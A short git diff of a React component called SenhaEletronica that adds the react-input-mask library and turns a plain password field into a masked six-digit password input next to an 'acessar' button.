@@ -1,5 +1,6 @@
 import React from 'react'
 import './SenhaEletronica.css'
+import InputMask from 'react-input-mask';
 import { useNavigate } from 'react-router-dom'
 import { useRef, useState } from 'react'
 
@@ -43,7 +44,7 @@ const SenhaEletronica = () => {
         </div>
         <div className='form2'>
             <span>senha eletrônica</span>
-            <input type="password" placeholder='' onChange={defineSenha} />
+            <InputMask mask="999999" maskChar=" " disableUnderline type="password" placeholder='' onChange={defineSenha} />
             <button onClick={abrirErro}>acessar</button>
         </div>
     </div>
